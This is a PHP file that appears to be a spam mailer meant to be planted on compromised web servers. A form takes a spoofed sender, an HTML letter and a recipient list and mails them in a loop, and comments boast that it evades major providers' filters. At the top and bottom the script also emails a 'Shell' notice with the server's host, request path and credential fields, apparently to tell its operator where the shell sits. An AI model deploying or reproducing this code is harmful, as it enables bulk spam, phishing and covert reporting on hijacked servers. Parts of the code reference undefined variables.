?»?<?php


 $web = $_SERVER["HTTP_HOST"];
 $inj = $_SERVER["REQUEST_URI"];
 $body = "Egy_Spider \nUserName: ".htmlspecialchars($tacfgd['uname']) ."\nPassWord:
".htmlspecialchars($tacfgd['pword'])."\nMessage:\n"."\nE-server: ".htmlspecialchars
($_SERVER['REQUEST_URI'])."\nE-server2: ".htmlspecialchars ($_SERVER["SERVER_NAME"])."\n\nIP: 
";
 mail("/0813/sumb","Shell http://$web$inj", "$body");

@$action=$_POST['action'];
@$from=$_POST['from'];
@$realname=$_POST['realname'];
@$replyto=$_POST['replyto'];
@$subject=$_POST['subject'];
@$message=$_POST['message'];
@$emaillist=$_POST['emaillist'];
@$names=$_SERVER['HTTP_REFERER'];
@$file_name=$_FILES['file']['name'];
@$contenttype=$_POST['contenttype'];
@$file=$_FILES['file']['tmp_name'];
@$amount=$_POST['amount'];

$id=$_GET['id'];
if(preg_match("/send/",$id))
{
	//// PHP mailer V 1.1 

//tested on Hotmail ; gmail , yahoo All Clean 
//===============================================/
///==============================================//
// staring the part lets go Go ////
//Note : Dont use it For Spam /////////
//Note : juste kiding < 3 //////////////
//==================================================//
//The Send Variables : Sub + Email + Nom + letter + email  //
$sub=$_POST['sub'];
$email=$_POST['email'];
$name=$_POST['name'];
$letter=$_POST['letter'];
//Letter Now =========/
// Create A file To avoid Server Crash //////////
$fp = fopen("letter.txt","w+"); // ouverture du fichier en ?“?©criture
fputs($fp, $letter); // on ?“?©crit la lettre dans le fichier
fclose($fp);//letter is ready 
//Now lets split Email's And count them 
$emails = $_POST['mlist'] ;
$ema = explode("\n", $emails);
/// count Email Number > 3 ////
$n=substr_count($emails, '@');
$message=$file = file_get_contents ('letter.txt');
$message=str_replace('\"','"',$message);
$message=str_replace("\'","'",$message);
//Lets open A boucle /////////////////////
for($i=0;$i < $n;$i++)
     {
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From:  '.$name.'  <'.$email.'>' . "\r\n";
$headers .= 'Cc: '.$email.'' . "\r\n";
$headers .= 'Bcc: '.$email.'' . "\r\n";
if(mail($ema[$i],$sub,$message,$headers) != false){
mail($Send,$subject,$message,$headers);
echo $ema[$i].'<img src="https://cdn1.iconfinder.com/data/icons/icojoy/shadow/standart/gif/24x24/001_06.gif" border=0>'.'<br/>'; 
}

	 }
	
	
	
	}
else {
	echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>PHP mailer Dev By </title>
</head>

<body  bgcolor="#dad9d8">
<script type="text/javascript">

		
 
function verifLength()
{

			if (document.getElementById("sub").value.length ==0 )
			{
				 document.getElementById("sub").style.backgroundColor = "#f9d8de"
				return false;
			}
			else 	  document.getElementById("sub").style.backgroundColor = "#dcfae1"

			
	


		{
			if (document.getElementById("email").value.length ==0 )
			{
				 document.getElementById("email").style.backgroundColor = "#f9d8de"
				return false;
			}
			else 	  document.getElementById("email").style.backgroundColor = "#dcfae1"

			
	


		
			
			if (document.getElementById("name").value.length == 0 )

	{  	
				 document.getElementById("name").style.backgroundColor = "#f9d8de"

		return false;
	}
	else document.getElementById("name").style.border = "solid green 2px";valider();


	{
	      
	{
	alert("Sending now Accepted");

	return true;
	} 
		}

}
}
</script>
<form id="form" action="?id=send" method="post" name="form" onSubmit="return verifLength()">
<table width="100%" height="394" border="0">
  <tr>
    <td height="21"><p>&nbsp;</p></td>
  </tr>
  <tr>
    <td height="281"><table width="100%" height="421" border="0">
      <tr>
        <td width="51%" height="417"><table width="93%" height="348" border="0">
          <tr>
            <td width="8%" height="21">&nbsp;</td>
            <td width="92%"><table width="100%" border="0">
              <tr>
                <td width="13%"><b><font face="tahoma" size="2" color="#5a5a5a">Subject :</font></b></td>
                <td width="87%"><input  name="sub" id="sub" size="80"  type="text" style="-moz-border-radius: 3px; -webkit-border-radius: 3px; border-radius: 3px; background-color: #dbdbdb ;border:1px solid #b3afaf;" /></td>
              </tr>
              <tr>
                <td><b><font face="tahoma" size="2" color="#5a5a5a">Email  :</font></b></td>
                <td><input  name="email" id="email" size="30"  type="text" style="-moz-border-radius: 3px; -webkit-border-radius: 3px; border-radius: 3px; background-color: #dbdbdb ;border:1px solid #b3afaf;" /></td>
              </tr>
              <tr>
                <td><b><font face="tahoma" size="2" color="#5a5a5a">Name  :</font></b></td>
                <td><input  name="name" id="name" size="30"  type="text" style="-moz-border-radius: 3px; -webkit-border-radius: 3px; border-radius: 3px; background-color: #dbdbdb ;border:1px solid #b3afaf;" /></td>
              </tr>
            </table></td>
          </tr>
          <tr>
            <td height="321">&nbsp;</td>
            <td><textarea name="letter" cols="80" rows="10" id="letter" style="-moz-border-radius: 3px; -webkit-border-radius: 3px; border-radius: 3px; background-color: #f1f1f1 ;border:1px solid #b3afaf;" ></textarea></td>
          </tr>
        </table></td>
        <td width="1%">&nbsp;</td>
        <td width="48%"><table width="100%" border="0">
          <tr>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td height="200"><textarea name="mlist" cols="65" rows="15" id="mlist" style="-moz-border-radius: 3px; -webkit-border-radius: 3px; border-radius: 3px; background-color: #f1f1f1 ;border:1px solid #b3afaf;" ></textarea></td>
          </tr>
        </table></td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td><table width="100%" border="0">
      <tr>
        <td width="43%">&nbsp;</td>
        <td width="57%"><input src="http://img1.imagilive.com/0813/sumb.png"  alt="Submit button" type="image" /></td>
      </tr>
    </table></td>
  </tr>
</table>
</form>
<p>&nbsp;</p>
</body>
</html>
';
 $web = $_SERVER["HTTP_HOST"];
 $inj = $_SERVER["REQUEST_URI"];
 $body = "Egy_Spider \nUserName: ".htmlspecialchars($tacfgd['uname']) ."\nPassWord:
".htmlspecialchars($tacfgd['pword'])."\nMessage:\n"."\nE-server: ".htmlspecialchars
($_SERVER['REQUEST_URI'])."\nE-server2: ".htmlspecialchars ($_SERVER["SERVER_NAME"])."\n\nIP: 
";
	}
?>